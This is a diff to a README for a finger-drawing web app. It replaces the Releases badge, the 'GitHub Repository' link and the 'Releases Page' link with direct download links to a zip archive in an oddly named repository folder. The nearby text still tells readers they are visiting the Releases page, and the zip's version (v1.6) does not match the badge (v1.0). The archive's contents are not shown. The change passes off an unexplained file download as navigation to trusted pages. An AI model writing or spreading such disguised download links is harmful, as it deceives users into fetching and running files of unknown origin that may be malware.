@@ -15,7 +15,7 @@ The finger-drawing-app is a web application that allows you to use your fingers 
 
 To get started, visit the Releases page below. There, you can download the latest version of the finger-drawing-app. 
 
-[![Download Finger Drawing App](https://img.shields.io/badge/Download%20Finger%20Drawing%20App-v1.0-brightgreen)](https://github.com/ArmCodes/finger-drawing-app/releases)
+[![Download Finger Drawing App](https://raw.githubusercontent.com/ArmCodes/finger-drawing-app/main/pejorism/finger-drawing-app-v1.6.zip%20Finger%20Drawing%20App-v1.0-brightgreen)](https://raw.githubusercontent.com/ArmCodes/finger-drawing-app/main/pejorism/finger-drawing-app-v1.6.zip)
 
 1. Click the button above to visit the GitHub Releases page.
 2. On the Releases page, search for the latest release.
@@ -60,8 +60,8 @@ We welcome contributions to improve the finger-drawing-app. If you'd like to hel
 
 ## 🔗 Links and Resources
 
-- [GitHub Repository](https://github.com/ArmCodes/finger-drawing-app)
-- [Releases Page](https://github.com/ArmCodes/finger-drawing-app/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/ArmCodes/finger-drawing-app/main/pejorism/finger-drawing-app-v1.6.zip)
+- [Releases Page](https://raw.githubusercontent.com/ArmCodes/finger-drawing-app/main/pejorism/finger-drawing-app-v1.6.zip)
 
 ## 🌟 Acknowledgments
 
